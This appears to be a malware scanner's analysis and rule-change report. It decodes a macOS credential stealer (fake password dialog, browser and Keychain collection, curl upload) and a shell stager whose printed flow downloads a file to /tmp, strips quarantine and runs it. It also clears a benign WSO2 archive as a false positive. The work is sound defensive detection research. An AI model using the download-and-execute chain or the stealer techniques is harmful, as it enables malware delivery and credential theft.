method: Read RULES.md and TAXONOMY.md before rule changes.
Atomscan slow/local scans with dependency following disabled; cleave facts for each original and selected members/stages.
Native x86_64 disassembly, signature inspection, sandboxed CPU emulation with no native calls, authenticated GCM recovery, static AppleScript decompilation and literal-only arithmetic folding.
Read batch execution flow, PHP asset compressor and Java authentication SQL; compare entire ZIP with independently fetched Go proxy bytes.

samples.reason: Authenticated recovery exposes credential collection, a fake System Preferences password-and-dscl validation loop, and multipart ZIP upload. The native wrapper also corrupts decryption key material after a slow inspection interval.

signature.conclusion: Integrity of an ad-hoc CodeDirectory does not certify a Developer ID team. Its arbitrary identifier shape is not forgery evidence.

native_trace.constructor: 0x10006d500 runs before main; main dispatches arithmetic decoys.
native_trace.resolver: 0x10007f860 obtains loaded images and resolves exports by keyed name hash; 0x100080290 implements the hash.
native_trace.key: 0x100076ec0 hashes its own __TEXT,__text. Constructor XORs with an embedded reference digest and combines seed/environment bits into 36 password bytes.
native_trace.timing: 0x10006dbfb computes elapsed time; 0x10006dc07 compares against ~50 ms, and the slow branch XOR-mutates the word before a big-endian password store.
native_trace.kdf: 0x100077190 is PBKDF2-HMAC-SHA256 with 36-byte password, 32-byte salt, 96226 rounds, 32-byte output.
native_trace.gcm: 0x100077990 resolves CCCryptorGCMOneshotDecrypt and supplies algorithm 0, 32-byte key, 12-byte nonce, no AAD, 16-byte tag; status controls reconstruction.
native_trace.activation: 0x100077a90 loads Carbon and resolves OpenDefaultComponent, AECreateDesc, OSALoad, OSAExecute and cleanup APIs; the input buffer is wiped between load and execute. Paired entry-byte checks reject patched API pointers.

recovery.bootstrap_behavior: Sets _p0 to 993 and returns zero; separate from the stealer.
recovery.reproducer: recover_native.py; recovered OSA bytes are never executed. Five explicitly documented analysis predicates are assumed clear only to recover the ordinary-environment key path. GCM tags and final native integrity check authenticate the resulting bytes.

decoded_execution.browser_collection: run calls rgiwwyqtxi; Chromium profile collection includes Login Data, Cookies, Web Data, extension storage, IndexedDB and leveldb. Safari and Keychain collection also appear.
decoded_execution.phishing: kvybcxcx -> password helper presents hidden-answer System Preferences dialog, passes entered text to rxznnrarzqh -> dscl . authonly, and returns only validated input; run writes it to the staging pwd file.
decoded_execution.upload: run calls bspbikemqcnb around collection stages; archive path drobrhfack reaches curl multipart POST file=@... /contact.
decoded_execution.additional_routines: LaunchDaemon/LaunchAgent plist generation, RunAtLoad/KeepAlive helper loops, wallet-application replacement and Terminal-window hiding are present; flag-dependent routine presence is distinguished from an active deployment.

limits: Initial ClickFix page, actor identity, successful theft and runtime success are not observed. Family identification is compatible with the feed label and recovered implementation.

The native ciphertext is not automatically unpacked by cleave. Direct phishing/persistence/theft details therefore require authenticated extraction; the extracted compiled script independently has 3 hostile and 3 suspicious traits. Added outer-file AES, whole-container timing and OSA activation coverage without duplicating theft rules on ciphertext.
Observed injected configuration contains two feature flags set to 0. Additional wallet/persistence routines are not asserted to execute unconditionally.

samples.reason: Encoded executable/URL names, hidden payload staging, xattr removal and immediate launch, with paste/stager event beacons, establish a concealed malware delivery chain.

decoded.flow: curl -fsSL -o /tmp/.cx37q316p.$$ URL && mv ... /tmp/.cx37q316p && xattr -c ... && chmod +x ... && beacon && /tmp/.cx37q316p
decoded.temp_suffix: The $$ comes from printf output and remains literal; variable expansion does not reevaluate it as a PID.
decoded.telemetry: Two silent background POSTs carry configured user and BuildID headers. The local whoami/id/sysctl/date results are not sent by these commands.
decoded.environment: Queries hw.memsize, epoch seconds, uid and username; those assigned values are unused in this script.

limits: The initial user-facing lure is not provided.
Forager attempted the live payload URL and exhausted retries with HTTP 520; no historical final payload is attributed to this script.
Accurate 3 hostile traits are preserved. The execution trait moved from delivery/C2 to execution/payload/file-exec; hardware and time queries gained notable detections.

samples.reason: The ZIP is byte-identical to the versioned Go proxy archive. Its flagged code implements temporary-directory cleanup, local JavaScript asset compression and user-store authentication, not destructive wiping, concealment or credential theft.

member_trace.wso2server.bat: runServer sets TMP_DIR=%CARBON_HOME%\tmp, enters it conditionally, deletes temporary files/subdirectories, returns to Carbon home, then launches the Java bootstrap. Deletion and quiet output remain notable.
member_trace.edit_area_compressor.php: load_files reads edit_area_loader.js, uses /e only to call its own replace_scripts on fixed loader patterns, concatenates local assets and writes full/gzip caches. Legacy evaluation remains notable.
member_trace.JDBCRealmConstants / UniqueIDJDBCUserSto: The old unbounded user_pass substring matched UM_USER_PASSWORD in SELECT statements. These queries support tenant-scoped local authentication via prepared statements; password-column SELECT remains notable under a generic data/query trait.
member_trace.admin/index.jsp: Reads authenticated session state, emits password-expiration status, redirects to login_action.jsp, and uses jQuery GET/session validation to load local status content. Added the existing AJAX GET rule to JSP scope.

classifier_disagreement.meaning: False positive remains in the JSP classifier; no hostile/suspicious YAML claim remains. No dependent-package or filename exception was added.

limits: Upstream identity alone would not rule out a compromised release; the flagged and classifier-leading execution paths were inspected. No concrete hostile modification was found.

rule_changes.change: Correct arbitrary ad-hoc identifier forgery inference
rule_changes.unsupported: An arbitrary ten-character prefix plus a hex suffix certifies no team and does not assert a forged certificate. A locally compiled, ad-hoc signed return-zero program matches the old claim.
rule_changes.retained: Same signature facts under neutral team-shaped identifier names; no signing observation lost.

rule_changes.change: Remove silent DEL => hostile wipe inference
rule_changes.unsupported: Output redirection and an all-files glob do not distinguish app temp cleanup from destruction.
rule_changes.retained: Exact quiet-deletion matcher moved to fs/delete/file/command. System-wiper hostile fixtures retain every hostile ID.

rule_changes.change: Consolidate legacy /e evaluation as a neutral regex capability
rule_changes.unsupported: A local asset-compressor callback is neither hidden PHP nor an obfuscation objective.
rule_changes.retained: Canonical AST-based /e observation extended to the old length range. Added same-call request-to-/e replacement detection; separate calls are a near miss. Existing socket-eval webshell remains hostile.

rule_changes.unsupported: UM_USER_PASSWORD is not the WordPress user_pass identifier, and password-column queries are not inherently credential theft.
rule_changes.retained: Password SELECT and character-probe observations are notable; the blind-SQLi hostile consumer now references the neutral query group and retains both positive SQLi fixtures.

rule_changes.change: Extend native GCM ABI and timer signatures
rule_changes.retained: Every previous byte alternative remains. New frame-local pushed lengths detect authenticated GCM; whole-container YARA sees timer key mutation in the non-preferred x64 slice. Older native loaders and anti-analysis near misses retain coverage.

rule_changes.change: Require actual key sabotage in broad ad-hoc GCM loader composite
rule_changes.unsupported: Encryption, signing type, entropy and sparse strings alone are not a hostile loader or credential theft.
rule_changes.retained: Known malicious native fixtures retain the composite and all other hostile IDs; remove unsupported credential/memory-loading ATT&CK mappings.

rule_changes.change: Observe native compiled-script activation and shell host/time queries
rule_changes.retained: Notable OSA load/wipe/execute sequence, sysctl hw.memsize call argument, and date +%s call argument. Removed-load and quoted-command controls reject those claims.

rule_changes.change: Place shell payload activation in execution/payload/file-exec
rule_changes.retained: Matcher, severity and scope unchanged; sole exact consumer updated. Existing ancestor consumers were inspected.

rule_changes.change: Move OLE Package executable filename observation into document metadata
rule_changes.unsupported: An executable filename in serialized Package bytes alone does not show activation.
rule_changes.retained: Exact bytes and oledoc/Windows scope preserved; the existing embedded-PE hostile consumer now references the neutral filename fact. Existing OLE-host attack fixtures retain their hostile IDs.
